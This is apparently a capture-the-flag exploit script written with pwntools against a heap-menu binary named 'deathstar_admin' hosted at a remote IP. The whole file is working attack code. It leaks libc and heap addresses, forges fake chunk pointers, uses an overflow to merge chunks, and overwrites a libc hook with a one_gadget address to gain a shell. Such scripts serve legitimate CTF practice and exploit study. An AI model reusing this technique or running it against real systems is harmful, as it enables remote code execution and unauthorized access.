from pwn import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('./deathstar_admin')
libc = ELF('./libc.so.6')

debug = 0

if debug:
    io = process('./deathstar_admin')
else:
    io = remote('43.143.254.94',10255)

def p():
    gdb.attach(proc.pidof(io)[0])

one_gadget= [0x45226,0x4527a,0xf03a4,0xf1247]

def add(size,content):
    io.sendlineafter(b"choose an action:",str(1))
    io.sendlineafter(b"weapon length:",str(size))
    io.sendafter(b"weapon detail:",content)

def show(idx):
    io.sendlineafter(b"choose an action:",str(2))
    io.sendlineafter(b"weapon index:",str(idx))

def edit(idx,content):
    io.sendlineafter(b"choose an action:",str(3))
    io.sendlineafter(b"weapon index:",str(idx))
    io.sendafter(b"your additional info:",content)

def delete(idx):
    io.sendlineafter(b"choose an action:",str(4))
    io.sendlineafter(b"weapon index:",str(idx))

add(0x88,b'aaa') #idx = 0
add(0x88,b'aaa') #idx = 1
add(0x88,b'aaa') #idx = 2
delete(0)
delete(1)
add(0x88,b'\n') #idx = 0
show(0)
libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x3c4b0a
success("libc_base -->" + hex(libc_base))

edit(0,b'a' *8)
show(0)
io.recvuntil(b'a' * 8)
heap_base = u64(io.recvuntil(b'\x0a',drop=True).ljust(8,b'\x00')) - 0xd0
success("heap_base -->" + hex(heap_base)) 

add(0x88,b'\n') #idx = 1
add(0x88,b'\n') #idx = 3
fack_fb = heap_base + 0xe0
fack_bk = heap_base + 0xe0
payload = p64(0) + p64(0x80 + 0x20 + 0x91) + p64(fack_fb) + p64(fack_bk) 
edit(1,payload)
over_flow = b'\x00' * 0x80 + p64(0x130) + b'\x20'
edit(2,over_flow)

#delete(1)
delete(3) # 合并
delete(0)
add(0x400,b'\n') #idx = 0

target_addr = libc_base + 0x3c67a8
payload = p64(0) * 15 + p64(0x21) + p64(0x88) 
payload += p64(target_addr)
edit(0,payload) # 往里面写
edit(2,p64(one_gadget[1] + libc_base)) # 任意写
#p()
delete(0)

io.interactive()

